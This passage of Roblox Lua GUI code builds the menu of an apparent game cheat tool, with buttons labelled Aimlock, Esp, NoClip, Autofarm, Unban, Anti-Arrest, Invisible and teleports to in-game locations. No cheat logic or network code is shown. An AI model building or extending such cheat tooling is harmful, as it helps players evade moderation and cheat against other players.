SellingButton.Name = "SellingButton"
SellingButton.Parent = MenuFrame
SellingButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SellingButton.BorderSizePixel = 0
SellingButton.Position = UDim2.new(0.0986621454, 0, 0.716439128, 0)
SellingButton.Size = UDim2.new(0, 0, 0, 0)
SellingButton.AutoButtonColor = false
SellingButton.Font = Enum.Font.GothamBlack
SellingButton.Text = "Selling Tools"
SellingButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SellingButton.TextSize = 0

DropShadowHolder.Name = "DropShadowHolder"
DropShadowHolder.Parent = SwagmodeFrame
DropShadowHolder.BackgroundTransparency = 1.000
DropShadowHolder.BorderSizePixel = 0
DropShadowHolder.Size = UDim2.new(0, 0, 0, 0)
DropShadowHolder.ZIndex = 0

DropShadow.Name = "DropShadow"
DropShadow.Parent = DropShadowHolder
DropShadow.AnchorPoint = Vector2.new(0.5, 0.5)
DropShadow.BackgroundTransparency = 1.000
DropShadow.BorderSizePixel = 0
DropShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
DropShadow.Size = UDim2.new(0, 0, 0, 0)
DropShadow.ZIndex = 0
DropShadow.Image = "rbxassetid://6015897843"
DropShadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
DropShadow.ImageTransparency = 0.200
DropShadow.ScaleType = Enum.ScaleType.Slice
DropShadow.SliceCenter = Rect.new(49, 49, 450, 450)

TopLine.Name = "TopLine"
TopLine.Parent = SwagmodeFrame
TopLine.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
TopLine.BorderSizePixel = 0
TopLine.Position = UDim2.new(0.256198347, 0, 0, 0)
TopLine.Size = UDim2.new(0, 0, 0, 0)

SideInfo.Name = "SideInfo"
SideInfo.Parent = SwagmodeFrame
SideInfo.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SideInfo.BorderSizePixel = 0
SideInfo.Position = UDim2.new(0.778512418, 0, 0.020833334, 0)
SideInfo.Size = UDim2.new(0, 0, 0, 0)

TargetImage.Name = "TargetImage"
TargetImage.Parent = SideInfo
TargetImage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TargetImage.Position = UDim2.new(0.0950299203, 0, 0.0244709235, 0)
TargetImage.Size = UDim2.new(0, 0, 0, 0)
TargetImage.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
TargetImage.ImageColor3 = Color3.fromRGB(300, 300, 300)

UICorner.CornerRadius = UDim.new(0, 500)
UICorner.Parent = TargetImage

SetNearestButton.Name = "SetNearestButton"
SetNearestButton.Parent = SideInfo
SetNearestButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SetNearestButton.BorderSizePixel = 0
SetNearestButton.Position = UDim2.new(0.072641857, 0, 0.851063848, 0)
SetNearestButton.Size = UDim2.new(0, 0, 0, 0)
SetNearestButton.AutoButtonColor = false
SetNearestButton.Font = Enum.Font.GothamBlack
SetNearestButton.Text = "Set Nearest"
SetNearestButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SetNearestButton.TextSize = 0

CashLabel.Name = "CashLabel"
CashLabel.Parent = SideInfo
CashLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
CashLabel.BorderSizePixel = 0
CashLabel.Position = UDim2.new(0.072641857, 0, 0.519756854, 0)
CashLabel.Size = UDim2.new(0, 0, 0, 0)
CashLabel.Font = Enum.Font.SourceSans
CashLabel.Text = "Cash:"
CashLabel.TextColor3 = Color3.fromRGB(72, 72, 72)
CashLabel.TextSize = 0

TargetTextbox.Name = "TargetTextbox"
TargetTextbox.Parent = SideInfo
TargetTextbox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TargetTextbox.BorderSizePixel = 0
TargetTextbox.Position = UDim2.new(0.072641857, 0, 0.392097205, 0)
TargetTextbox.Size = UDim2.new(0, 0, 0, 0)
TargetTextbox.Font = Enum.Font.GothamBlack
TargetTextbox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
TargetTextbox.Text = ""
TargetTextbox.TextColor3 = Color3.fromRGB(255, 255, 255)
TargetTextbox.TextSize = 0
TargetTextbox.TextWrapped = true
TargetTextbox.TextScaled = true

BountyLabel.Name = "BountyLabel"
BountyLabel.Parent = SideInfo
BountyLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
BountyLabel.BorderSizePixel = 0
BountyLabel.Position = UDim2.new(0.072641857, 0, 0.633550763, 0)
BountyLabel.Size = UDim2.new(0, 0, 0, 0)
BountyLabel.Font = Enum.Font.SourceSans
BountyLabel.Text = "Bounty:"
BountyLabel.TextColor3 = Color3.fromRGB(72, 72, 72)
BountyLabel.TextSize = 0

CrewLabel.Name = "CrewLabel"
CrewLabel.Parent = SideInfo
CrewLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
CrewLabel.BorderSizePixel = 0
CrewLabel.Position = UDim2.new(0.072641857, 0, 0.737304032, 0)
CrewLabel.Size = UDim2.new(0, 0, 0, 0)
CrewLabel.Font = Enum.Font.SourceSans
CrewLabel.Text = "Crew:"
CrewLabel.TextColor3 = Color3.fromRGB(72, 72, 72)
CrewLabel.TextSize = 0
CrewLabel.TextScaled = true

Buttons.Name = "Buttons"
Buttons.Parent = SwagmodeFrame
Buttons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Buttons.BackgroundTransparency = 1.000
Buttons.Position = UDim2.new(0.256198347, 0, 0.0297619049, 0)
Buttons.Size = UDim2.new(0, 0, 0, 0)

MainFrame.Name = "MainFrame"
MainFrame.Parent = Buttons
MainFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
MainFrame.BackgroundTransparency = 1.000
MainFrame.Size = UDim2.new(0, 0, 0, 0)
MainFrame.Visible = false

FreeFists.Name = "FreeFists"
FreeFists.Parent = MainFrame
FreeFists.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
FreeFists.BorderSizePixel = 0
FreeFists.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
FreeFists.Size = UDim2.new(0, 0, 0, 0)
FreeFists.Font = Enum.Font.GothamBlack
FreeFists.Text = "FreeFists(T)"
FreeFists.TextColor3 = Color3.fromRGB(255, 255, 255)
FreeFists.TextSize = 0




NoRecoil.Name = "NoRecoil"
NoRecoil.Parent = MainFrame
NoRecoil.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
NoRecoil.BorderSizePixel = 0
NoRecoil.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
NoRecoil.Size = UDim2.new(0, 0, 0, 0)
NoRecoil.Font = Enum.Font.GothamBlack
NoRecoil.Text = "NoRecoil"
NoRecoil.TextColor3 = Color3.fromRGB(255, 255, 255)
NoRecoil.TextSize = 0

GoTo.Name = "GoTo"
GoTo.Parent = MainFrame
GoTo.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GoTo.BorderSizePixel = 0
GoTo.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
GoTo.Size = UDim2.new(0, 0, 0, 0)
GoTo.Font = Enum.Font.GothamBlack
GoTo.Text = "GoTo"
GoTo.TextColor3 = Color3.fromRGB(255, 255, 255)
GoTo.TextSize = 0

View.Name = "View"
View.Parent = MainFrame
View.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
View.BorderSizePixel = 0
View.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
View.Size = UDim2.new(0, 0, 0, 0)
View.Font = Enum.Font.GothamBlack
View.Text = "View"
View.TextColor3 = Color3.fromRGB(255, 255, 255)
View.TextSize = 0

Target.Name = "Target"
Target.Parent = MainFrame
Target.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Target.BorderSizePixel = 0
Target.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
Target.Size = UDim2.new(0, 0, 0, 0)
Target.Font = Enum.Font.GothamBlack
Target.Text = "Target"
Target.TextColor3 = Color3.fromRGB(255, 255, 255)
Target.TextSize = 0

NoClip.Name = "NoClip"
NoClip.Parent = MainFrame
NoClip.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
NoClip.BorderSizePixel = 0
NoClip.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
NoClip.Size = UDim2.new(0, 0, 0, 0)
NoClip.Font = Enum.Font.GothamBlack
NoClip.Text = "NoClip(Z)"
NoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
NoClip.TextSize = 0


Reach.Name = "Reach"
Reach.Parent = MainFrame
Reach.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Reach.BorderSizePixel = 0
Reach.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
Reach.Size = UDim2.new(0, 0, 0, 0)
Reach.Font = Enum.Font.GothamBlack
Reach.Text = "Reach"
Reach.TextColor3 = Color3.fromRGB(255, 255, 255)
Reach.TextSize = 0

Headless.Name = "Headless"
Headless.Parent = MainFrame
Headless.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Headless.BorderSizePixel = 0
Headless.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
Headless.Size = UDim2.new(0, 0, 0, 0)
Headless.Font = Enum.Font.GothamBlack
Headless.Text = "Headless"
Headless.TextColor3 = Color3.fromRGB(255, 255, 255)
Headless.TextSize = 0

QuickTpFrame.Name = "QuickTpFrame"
QuickTpFrame.Parent = Buttons
QuickTpFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
QuickTpFrame.BackgroundTransparency = 1.000
QuickTpFrame.Size = UDim2.new(0, 0, 0, 0)
QuickTpFrame.Visible = false

GunShop2.Name = "GunShop2"
GunShop2.Parent = QuickTpFrame
GunShop2.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GunShop2.BorderSizePixel = 0
GunShop2.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
GunShop2.Size = UDim2.new(0, 0, 0, 0)
GunShop2.Font = Enum.Font.GothamBlack
GunShop2.Text = "GunShop(UP)"
GunShop2.TextColor3 = Color3.fromRGB(255, 255, 255)
GunShop2.TextSize = 0

PrevPosition.Name = "PrevPosition"
PrevPosition.Parent = QuickTpFrame
PrevPosition.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
PrevPosition.BorderSizePixel = 0
PrevPosition.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
PrevPosition.Size = UDim2.new(0, 0, 0, 0)
PrevPosition.Font = Enum.Font.GothamBlack
PrevPosition.Text = "PrevPos"
PrevPosition.TextColor3 = Color3.fromRGB(255, 255, 255)
PrevPosition.TextSize = 0

Bank.Name = "Bank"
Bank.Parent = QuickTpFrame
Bank.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Bank.BorderSizePixel = 0
Bank.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
Bank.Size = UDim2.new(0, 0, 0, 0)
Bank.Font = Enum.Font.GothamBlack
Bank.Text = "Bank"
Bank.TextColor3 = Color3.fromRGB(255, 255, 255)
Bank.TextSize = 0

SafeZone1.Name = "SafeZone1"
SafeZone1.Parent = QuickTpFrame
SafeZone1.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SafeZone1.BorderSizePixel = 0
SafeZone1.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
SafeZone1.Size = UDim2.new(0, 0, 0, 0)
SafeZone1.Font = Enum.Font.GothamBlack
SafeZone1.Text = "Safe Zone #1"
SafeZone1.TextColor3 = Color3.fromRGB(255, 255, 255)
SafeZone1.TextSize = 0

SetSpawn.Name = "SetSpawn"
SetSpawn.Parent = QuickTpFrame
SetSpawn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SetSpawn.BorderSizePixel = 0
SetSpawn.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
SetSpawn.Size = UDim2.new(0, 0, 0, 0)
SetSpawn.Font = Enum.Font.GothamBlack
SetSpawn.Text = "SetSpawn"
SetSpawn.TextColor3 = Color3.fromRGB(255, 255, 255)
SetSpawn.TextSize = 0

Sewer.Name = "Sewer"
Sewer.Parent = QuickTpFrame
Sewer.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Sewer.BorderSizePixel = 0
Sewer.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
Sewer.Size = UDim2.new(0, 0, 0, 0)
Sewer.Font = Enum.Font.GothamBlack
Sewer.Text = "Sewer"
Sewer.TextColor3 = Color3.fromRGB(255, 255, 255)
Sewer.TextSize = 0

Playground.Name = "Playground"
Playground.Parent = QuickTpFrame
Playground.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Playground.BorderSizePixel = 0
Playground.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
Playground.Size = UDim2.new(0, 0, 0, 0)
Playground.Font = Enum.Font.GothamBlack
Playground.Text = "Playground"
Playground.TextColor3 = Color3.fromRGB(255, 255, 255)
Playground.TextSize = 0

GasStation.Name = "GasStation"
GasStation.Parent = QuickTpFrame
GasStation.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GasStation.BorderSizePixel = 0
GasStation.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
GasStation.Size = UDim2.new(0, 0, 0, 0)
GasStation.Font = Enum.Font.GothamBlack
GasStation.Text = "GasStation"
GasStation.TextColor3 = Color3.fromRGB(255, 255, 255)
GasStation.TextSize = 0

LavaBase.Name = "LavaBase"
LavaBase.Parent = QuickTpFrame
LavaBase.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
LavaBase.BorderSizePixel = 0
LavaBase.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
LavaBase.Size = UDim2.new(0, 0, 0, 0)
LavaBase.Font = Enum.Font.GothamBlack
LavaBase.Text = "LavaBase"
LavaBase.TextColor3 = Color3.fromRGB(255, 255, 255)
LavaBase.TextSize = 0

SavePos.Name = "SavePos"
SavePos.Parent = QuickTpFrame
SavePos.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SavePos.BorderSizePixel = 0
SavePos.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
SavePos.Size = UDim2.new(0, 0, 0, 0)
SavePos.Font = Enum.Font.GothamBlack
SavePos.Text = "SavePos"
SavePos.TextColor3 = Color3.fromRGB(255, 255, 255)
SavePos.TextSize = 0

SafeZone2.Name = "SafeZone2"
SafeZone2.Parent = QuickTpFrame
SafeZone2.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SafeZone2.BorderSizePixel = 0
SafeZone2.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
SafeZone2.Size = UDim2.new(0, 0, 0, 0)
SafeZone2.Font = Enum.Font.GothamBlack
SafeZone2.Text = "Safe Zone #2"
SafeZone2.TextColor3 = Color3.fromRGB(255, 255, 255)
SafeZone2.TextSize = 0
UFO.Name = "UFO"
UFO.Parent = QuickTpFrame
UFO.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
UFO.BorderSizePixel = 0
UFO.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
UFO.Size = UDim2.new(0, 0, 0, 0)
UFO.Font = Enum.Font.GothamBlack
UFO.Text = "UFO"
UFO.TextColor3 = Color3.fromRGB(255, 255, 255)
UFO.TextSize = 0

TacoShop.Name = "TacoShop"
TacoShop.Parent = QuickTpFrame
TacoShop.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
TacoShop.BorderSizePixel = 0
TacoShop.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
TacoShop.Size = UDim2.new(0, 0, 0, 0)
TacoShop.Font = Enum.Font.GothamBlack
TacoShop.Text = "TacoShop"
TacoShop.TextColor3 = Color3.fromRGB(255, 255, 255)
TacoShop.TextSize = 0

LoadPos.Name = "LoadPos"
LoadPos.Parent = QuickTpFrame
LoadPos.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
LoadPos.BorderSizePixel = 0
LoadPos.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
LoadPos.Size = UDim2.new(0, 0, 0, 0)
LoadPos.Font = Enum.Font.GothamBlack
LoadPos.Text = "LoadPos"
LoadPos.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadPos.TextSize = 0

GunShop1.Name = "GunShop1"
GunShop1.Parent = QuickTpFrame
GunShop1.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
GunShop1.BorderSizePixel = 0
GunShop1.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
GunShop1.Size = UDim2.new(0, 0, 0, 0)
GunShop1.Font = Enum.Font.GothamBlack
GunShop1.Text = "GunShop(AK)"
GunShop1.TextColor3 = Color3.fromRGB(255, 255, 255)
GunShop1.TextSize = 0

SideScriptsFrame.Name = "SideScriptsFrame"
SideScriptsFrame.Parent = Buttons
SideScriptsFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SideScriptsFrame.BackgroundTransparency = 1.000
SideScriptsFrame.Size = UDim2.new(0, 0, 0, 0)
SideScriptsFrame.Visible = false

Aimlock.Name = "Aimlock"
Aimlock.Parent = SideScriptsFrame
Aimlock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Aimlock.BorderSizePixel = 0
Aimlock.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
Aimlock.Size = UDim2.new(0, 0, 0, 0)
Aimlock.Font = Enum.Font.GothamBlack
Aimlock.Text = "Aimlock"
Aimlock.TextColor3 = Color3.fromRGB(255, 255, 255)
Aimlock.TextSize = 0
Users.Name = "Users"
Users.Parent = SideScriptsFrame
Users.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Users.BorderSizePixel = 0
Users.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
Users.Size = UDim2.new(0, 0, 0, 0)
Users.Font = Enum.Font.GothamBlack
Users.Text = "Users"
Users.TextColor3 = Color3.fromRGB(255, 255, 255)
Users.TextSize = 0

MoneyESP.Name = "MoneyESP"
MoneyESP.Parent = SideScriptsFrame
MoneyESP.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MoneyESP.BorderSizePixel = 0
MoneyESP.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
MoneyESP.Size = UDim2.new(0, 0, 0, 0)
MoneyESP.Font = Enum.Font.GothamBlack
MoneyESP.Text = "MoneyESP"
MoneyESP.TextColor3 = Color3.fromRGB(255, 255, 255)
MoneyESP.TextSize = 0

FullGod.Name = "FullGod"
FullGod.Parent = SideScriptsFrame
FullGod.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
FullGod.BorderSizePixel = 0
FullGod.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
FullGod.Size = UDim2.new(0, 0, 0, 0)
FullGod.Font = Enum.Font.GothamBlack
FullGod.Text = ""
FullGod.TextColor3 = Color3.fromRGB(255, 255, 255)
FullGod.TextSize = 0

Autofarm.Name = "Autofarm"
Autofarm.Parent = SideScriptsFrame
Autofarm.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Autofarm.BorderSizePixel = 0
Autofarm.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
Autofarm.Size = UDim2.new(0, 0, 0, 0)
Autofarm.Font = Enum.Font.GothamBlack
Autofarm.Text = "Autofarm"
Autofarm.TextColor3 = Color3.fromRGB(255, 255, 255)
Autofarm.TextSize = 0

HighTool.Name = "HighTool"
HighTool.Parent = SideScriptsFrame
HighTool.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
HighTool.BorderSizePixel = 0
HighTool.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
HighTool.Size = UDim2.new(0, 0, 0, 0)
HighTool.Font = Enum.Font.GothamBlack
HighTool.Text = "High Tool"
HighTool.TextColor3 = Color3.fromRGB(255, 255, 255)
HighTool.TextSize = 0

Esp.Name = "Esp"
Esp.Parent = SideScriptsFrame
Esp.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Esp.BorderSizePixel = 0
Esp.Position = UDim2.new(0.355005682, 0, 0.221326202, 0)
Esp.Size = UDim2.new(0, 0, 0, 0)
Esp.Font = Enum.Font.GothamBlack
Esp.Text = "Esp"
Esp.TextColor3 = Color3.fromRGB(255, 255, 255)
Esp.TextSize = 0

LastingBullets.Name = "LastingBullets"
LastingBullets.Parent = SideScriptsFrame
LastingBullets.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
LastingBullets.BorderSizePixel = 0
LastingBullets.Position = UDim2.new(0.678155124, 0, 0.409230769, 0)
LastingBullets.Size = UDim2.new(0, 0, 0, 0)
LastingBullets.Font = Enum.Font.GothamBlack
LastingBullets.Text = "LastingBullets"
LastingBullets.TextColor3 = Color3.fromRGB(255, 255, 255)
LastingBullets.TextSize = 0

Stamina.Name = "Stamina"
Stamina.Parent = SideScriptsFrame
Stamina.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Stamina.BorderSizePixel = 0
Stamina.Position = UDim2.new(0.680955052, 0, 0.221326202, 0)
Stamina.Size = UDim2.new(0, 0, 0, 0)
Stamina.Font = Enum.Font.GothamBlack
Stamina.Text = "Stamina"
Stamina.TextColor3 = Color3.fromRGB(255, 255, 255)
Stamina.TextSize = 0
Spin.Name = "Spin"
Spin.Parent = SideScriptsFrame
Spin.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Spin.BorderSizePixel = 0
Spin.Position = UDim2.new(0.681183517, 0, 0.0399999991, 0)
Spin.Size = UDim2.new(0, 0, 0, 0)
Spin.Font = Enum.Font.GothamBlack
Spin.Text = "Spin"
Spin.TextColor3 = Color3.fromRGB(255, 255, 255)
Spin.TextSize = 0

Unban.Name = "Unban"
Unban.Parent = SideScriptsFrame
Unban.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Unban.BorderSizePixel = 0
Unban.Position = UDim2.new(0.677926719, 0, 0.762864709, 0)
Unban.Size = UDim2.new(0, 0, 0, 0)
Unban.Font = Enum.Font.GothamBlack
Unban.Text = "Unban"
Unban.TextColor3 = Color3.fromRGB(255, 255, 255)
Unban.TextSize = 0

SwagUsers.Name = "SwagUsers"
SwagUsers.Parent = SideScriptsFrame
SwagUsers.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
SwagUsers.BorderSizePixel = 0
SwagUsers.Position = UDim2.new(0.677926719, 0, 0.590557039, 0)
SwagUsers.Size = UDim2.new(0, 0, 0, 0)
SwagUsers.Font = Enum.Font.GothamBlack
SwagUsers.Text = "SwagUsers"
SwagUsers.TextColor3 = Color3.fromRGB(255, 255, 255)
SwagUsers.TextSize = 0
--cant find me
LockTools.Name = "LockTools"
LockTools.Parent = SideScriptsFrame
LockTools.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
LockTools.BorderSizePixel = 0
LockTools.Position = UDim2.new(0.351977378, 0, 0.590557039, 0)
LockTools.Size = UDim2.new(0, 94, 0, 46)
LockTools.Font = Enum.Font.GothamBlack
LockTools.Text = "LockTools"
LockTools.TextColor3 = Color3.fromRGB(255, 255, 255)
LockTools.TextSize = 14.000

Invisible.Name = "Invisible"
Invisible.Parent = SideScriptsFrame
Invisible.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
Invisible.BorderSizePixel = 0
Invisible.Position = UDim2.new(0.355234176, 0, 0.0399999991, 0)
Invisible.Size = UDim2.new(0, 94, 0, 46)
Invisible.Font = Enum.Font.GothamBlack
Invisible.Text = "Invisible"
Invisible.TextColor3 = Color3.fromRGB(255, 255, 255)
Invisible.TextSize = 14.000

InfTools.Name = "InfTools"
InfTools.Parent = SideScriptsFrame
InfTools.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
InfTools.BorderSizePixel = 0
InfTools.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
InfTools.Size = UDim2.new(0, 94, 0, 46)
InfTools.Font = Enum.Font.GothamBlack
InfTools.Text = "InfTools"
InfTools.TextColor3 = Color3.fromRGB(255, 255, 255)
InfTools.TextSize = 14.000

TogglesFrame.Name = "TogglesFrame"
TogglesFrame.Parent = Buttons
TogglesFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TogglesFrame.BackgroundTransparency = 1.000
TogglesFrame.Size = UDim2.new(0, 316, 0, 325)
TogglesFrame.Visible = false

QToTp.Name = "QToTp"
QToTp.Parent = TogglesFrame
QToTp.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
QToTp.BorderSizePixel = 0
QToTp.Position = UDim2.new(0.0251458082, 0, 0.0399999991, 0)
QToTp.Size = UDim2.new(0, 94, 0, 46)
QToTp.Font = Enum.Font.GothamBlack
QToTp.Text = "Q to TP"
QToTp.TextColor3 = Color3.fromRGB(255, 255, 255)
QToTp.TextSize = 14.000

QToTpColor.Name = "QToTpColor"
QToTpColor.Parent = QToTp
QToTpColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
QToTpColor.BorderSizePixel = 0
QToTpColor.Size = UDim2.new(0, 93, 0, 5)
QToTpColor.Font = Enum.Font.SourceSans
QToTpColor.Text = ""
QToTpColor.TextColor3 = Color3.fromRGB(255, 0, 0)
QToTpColor.TextSize = 14.000

HideBlock.Name = "HideBlock"
HideBlock.Parent = TogglesFrame
HideBlock.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
HideBlock.BorderSizePixel = 0
HideBlock.Position = UDim2.new(0.024917312, 0, 0.221326202, 0)
HideBlock.Size = UDim2.new(0, 94, 0, 46)
HideBlock.Font = Enum.Font.GothamBlack
HideBlock.Text = "Hide Block"
HideBlock.TextColor3 = Color3.fromRGB(255, 255, 255)
HideBlock.TextSize = 14.000

HideBlockColor.Name = "HideBlockColor"
HideBlockColor.Parent = HideBlock
HideBlockColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
HideBlockColor.BorderSizePixel = 0
HideBlockColor.Size = UDim2.new(0, 93, 0, 5)
HideBlockColor.Font = Enum.Font.SourceSans
HideBlockColor.Text = ""
HideBlockColor.TextColor3 = Color3.fromRGB(255, 0, 0)
HideBlockColor.TextSize = 14.000

HideUser.Name = "HideUser"
HideUser.Parent = TogglesFrame
HideUser.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
HideUser.BorderSizePixel = 0
HideUser.Position = UDim2.new(0.0218890235, 0, 0.590557039, 0)
HideUser.Size = UDim2.new(0, 94, 0, 46)
HideUser.Font = Enum.Font.GothamBlack
HideUser.Text = "Hide User"
HideUser.TextColor3 = Color3.fromRGB(255, 255, 255)
HideUser.TextSize = 14.000

HideUserColor.Name = "HideUserColor"
HideUserColor.Parent = HideUser
HideUserColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
HideUserColor.BorderSizePixel = 0
HideUserColor.Size = UDim2.new(0, 93, 0, 5)
HideUserColor.Font = Enum.Font.SourceSans
HideUserColor.Text = ""
HideUserColor.TextColor3 = Color3.fromRGB(255, 0, 0)
HideUserColor.TextSize = 14.000

AutoStomp.Name = "AutoStomp"
AutoStomp.Parent = TogglesFrame
AutoStomp.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AutoStomp.BorderSizePixel = 0
AutoStomp.Position = UDim2.new(0.0221175179, 0, 0.409230769, 0)
AutoStomp.Size = UDim2.new(0, 94, 0, 46)
AutoStomp.Font = Enum.Font.GothamBlack
AutoStomp.Text = "Auto Stomp"
AutoStomp.TextColor3 = Color3.fromRGB(255, 255, 255)
AutoStomp.TextSize = 14.000

AutoStompColor.Name = "AutoStompColor"
AutoStompColor.Parent = AutoStomp
AutoStompColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AutoStompColor.BorderSizePixel = 0
AutoStompColor.Size = UDim2.new(0, 93, 0, 5)
AutoStompColor.Font = Enum.Font.SourceSans
AutoStompColor.Text = ""
AutoStompColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AutoStompColor.TextSize = 14.000

RocketRide.Name = "RocketRide"
RocketRide.Parent = TogglesFrame
RocketRide.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
RocketRide.BorderSizePixel = 0
RocketRide.Position = UDim2.new(0.0218890235, 0, 0.762864709, 0)
RocketRide.Size = UDim2.new(0, 94, 0, 46)
RocketRide.Font = Enum.Font.GothamBlack
RocketRide.Text = "Rocket Ride"
RocketRide.TextColor3 = Color3.fromRGB(255, 255, 255)
RocketRide.TextSize = 14.000

RocketRideColor.Name = "RocketRideColor"
RocketRideColor.Parent = RocketRide
RocketRideColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
RocketRideColor.BorderSizePixel = 0
RocketRideColor.Size = UDim2.new(0, 93, 0, 5)
RocketRideColor.Font = Enum.Font.SourceSans
RocketRideColor.Text = ""
RocketRideColor.TextColor3 = Color3.fromRGB(255, 0, 0)
RocketRideColor.TextSize = 14.000

AntiArrest.Name = "AntiArrest"
AntiArrest.Parent = TogglesFrame
AntiArrest.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiArrest.BorderSizePixel = 0
AntiArrest.Position = UDim2.new(0.352205783, 0, 0.409230769, 0)
AntiArrest.Size = UDim2.new(0, 94, 0, 46)
AntiArrest.Font = Enum.Font.GothamBlack
AntiArrest.Text = "Anti-Arrest"
AntiArrest.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiArrest.TextSize = 14.000

AntiArrestColor.Name = "AntiArrestColor"
AntiArrestColor.Parent = AntiArrest
AntiArrestColor.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
AntiArrestColor.BorderSizePixel = 0
AntiArrestColor.Size = UDim2.new(0, 93, 0, 5)
AntiArrestColor.Font = Enum.Font.SourceSans
AntiArrestColor.Text = ""
AntiArrestColor.TextColor3 = Color3.fromRGB(255, 0, 0)
AntiArrestColor.TextSize = 14.000

AntiGrab.Name = "AntiGrab"
AntiGrab.Parent = TogglesFrame
AntiGrab.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
AntiGrab.BorderSizePixel = 0
AntiGrab.Position = UDim2.new(0.351977378, 0, 0.762864709, 0)
AntiGrab.Size = UDim2.new(0, 94, 0, 46)
